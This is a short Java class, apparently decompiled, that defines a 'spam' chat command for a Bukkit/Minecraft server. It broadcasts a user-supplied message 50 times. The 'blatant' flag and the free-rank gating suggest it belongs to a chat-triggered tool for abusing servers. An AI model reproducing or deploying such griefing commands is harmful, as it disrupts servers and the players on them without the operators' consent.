package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import org.bukkit.Bukkit;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "spam",
   description = "Spam something in chat",
   blatant = true,
   rank = Rank.FREE
)
public class SpamCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      String msg = String.join(" ", var3);
      msg = msg.replace("&", "§");

      for (int i = 0; i < 50; i++) {
         Bukkit.broadcastMessage(msg);
      }
   }
}
